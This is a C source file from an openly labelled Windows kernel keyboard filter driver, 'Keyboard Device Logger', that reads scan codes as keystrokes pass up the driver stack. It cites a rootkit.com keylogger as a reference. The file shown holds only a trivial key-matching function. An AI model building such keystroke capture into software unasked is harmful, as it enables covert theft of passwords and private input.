/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the thread related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/
 */

#include "kdl.h"
#include "kdlkeyfilter.h"

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Filter out only the keys we wish to and to the list to be processed.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
BOOLEAN MatchKeyFilter( int i, 
					    PKEYBOARD_INPUT_DATA KeyData )
{
KdPrint( ("KDL: MatchKeyFilter() Called.\n") );

  // Example filter for down key signals only
/*
  if ( KeyData[i].Flags == KEY_MAKE)
  {
KdPrint( ("KDL: MatchKeyFilter() return TRUE.\n") );
   return TRUE;
  }
  else
  {
KdPrint( ("KDL: MatchKeyFilter() return FALSE.\n") );
   return FALSE;
  }
*/
 return TRUE;
}